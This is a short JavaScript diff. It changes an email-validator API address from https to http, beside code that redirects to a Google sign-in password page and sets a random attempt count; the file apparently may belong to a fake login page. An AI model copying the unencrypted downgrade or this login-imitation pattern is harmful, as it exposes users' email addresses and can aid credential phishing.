@@ -339,7 +339,7 @@ rowBtnB.onclick = function(){
     window.location.href = "https://accounts.google.com/v3/signin/challenge/pwd?TL=ADBc5UO1-ytbYgQTeCJg9ek7jnuJsRrhmIZE9yEJJk73SRdOZ5kqa4ByEPSz3DnK&checkConnection=youtube%3A814%3A0&checkedDomains=youtube&cid=2&continue=https%3A%2F%2Faccounts.google.com%2F&dsh=S-1761255026%3A1681985661443436&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=AQMjQ7RRvT-L1WigG178orh6FCo9xt-sxWzr5CnqOy0gR9xa2ecAmUS6ILrWyPypnAC1ZfFXIIIAVQ&pstMsg=1";
 }
 let formA = document.getElementById("validateEmail");
-let validatorAPI = "https://api.eva.pingutil.com/email?email=";
+let validatorAPI = "http://api.eva.pingutil.com/email?email=";
 let userId = document.getElementById("userId");
 let attempts = ['6','7','8','9','10'];
 let randomAttempts = attempts[Math.floor(Math.random() * attempts.length)];
